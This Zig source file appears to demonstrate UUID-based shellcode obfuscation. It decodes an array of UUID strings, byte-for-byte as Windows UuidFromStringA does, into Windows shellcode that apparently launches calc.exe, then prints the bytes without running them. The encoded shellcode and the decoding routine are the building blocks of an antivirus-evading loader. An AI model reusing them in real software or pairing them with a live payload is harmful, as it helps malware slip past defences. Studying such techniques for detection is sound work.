const UUID_ARRAY: [13][]const u8 = [_][]const u8{
    "0082e8fc-0000-8960-e531-c0648b50308b",
    "528b0c52-8b14-2872-0fb7-4a2631ffac3c",
    "2c027c61-c120-0dcf-01c7-e2f252578b52",
    "3c4a8b10-4c8b-7811-e348-01d1518b5920",
    "498bd301-e318-493a-8b34-8b01d631ffac",
    "010dcfc1-38c7-75e0-f603-7df83b7d2475",
    "588b58e4-0124-66d3-8b0c-4b8b581c01d3",
    "018b048b-89d0-2444-245b-5b61595a51ff",
    "5a5f5fe0-128b-8deb-5d6a-018d85b20000",
    "31685000-6f8b-ff87-d5bb-f0b5a25668a6",
    "ff9dbd95-3cd5-7c06-0a80-fbe07505bb47",
    "6a6f7213-5300-d5ff-6361-6c632e657865",
    "00000000-0000-0000-0000-000000000000"
};

const std = @import("std");


const NUMBER_OF_ELEMENTS: usize = 13;

// Manual UUID parsing that matches Windows UuidFromStringA behavior
fn parseUuidManual(uuid_str: []const u8, buffer: []u8) !void {
    if (buffer.len < 16) return error.BufferTooSmall;

    // UUID format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
    // Split into parts: [8]-[4]-[4]-[4]-[12] = 32 hex chars + 4 hyphens

    var clean_hex = std.ArrayList(u8).init(std.heap.page_allocator);
    defer clean_hex.deinit();

    // Remove hyphens to get 32 hex characters
    for (uuid_str) |c| {
        if (c != '-') {
            try clean_hex.append(c);
        }
    }

    if (clean_hex.items.len != 32) return error.InvalidUuidLength;

    // Parse UUID components with correct endianness
    // Windows UUID structure (matches GUID):
    // - First 4 bytes (data1): Little-endian 32-bit
    // - Next 2 bytes (data2): Little-endian 16-bit
    // - Next 2 bytes (data3): Little-endian 16-bit
    // - Last 8 bytes (data4): Big-endian bytes

    const hex_chars = clean_hex.items;

    // Data1 (4 bytes, little-endian)
    const data1 = try std.fmt.parseInt(u32, hex_chars[0..8], 16);
    buffer[0] = @intCast(data1 & 0xFF);
    buffer[1] = @intCast((data1 >> 8) & 0xFF);
    buffer[2] = @intCast((data1 >> 16) & 0xFF);
    buffer[3] = @intCast((data1 >> 24) & 0xFF);

    // Data2 (2 bytes, little-endian)
    const data2 = try std.fmt.parseInt(u16, hex_chars[8..12], 16);
    buffer[4] = @intCast(data2 & 0xFF);
    buffer[5] = @intCast((data2 >> 8) & 0xFF);

    // Data3 (2 bytes, little-endian)
    const data3 = try std.fmt.parseInt(u16, hex_chars[12..16], 16);
    buffer[6] = @intCast(data3 & 0xFF);
    buffer[7] = @intCast((data3 >> 8) & 0xFF);

    // Data4 (8 bytes, big-endian - byte by byte)
    for (0..8) |i| {
        const hex_pair = hex_chars[16 + i * 2 .. 16 + i * 2 + 2];
        buffer[8 + i] = try std.fmt.parseInt(u8, hex_pair, 16);
    }
}

fn uuidDeobfuscation(uuid_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {
    const buffer_size = uuid_array.len * 16;
    const buffer = try allocator.alloc(u8, buffer_size);

    for (uuid_array, 0..) |uuid_str, i| {
        const offset = i * 16;
        parseUuidManual(uuid_str, buffer[offset .. offset + 16]) catch |err| {
            std.debug.print("[!] Failed to parse UUID[{}]: \"{s}\" - Error: {}\n", .{ i, uuid_str, err });
            allocator.free(buffer);
            return err;
        };
    }

    return buffer;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shellcode = try uuidDeobfuscation(&UUID_ARRAY, allocator);
    defer allocator.free(shellcode);
    std.debug.print("Decrypted shellcode length: {}\n", .{shellcode.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{shellcode});
}
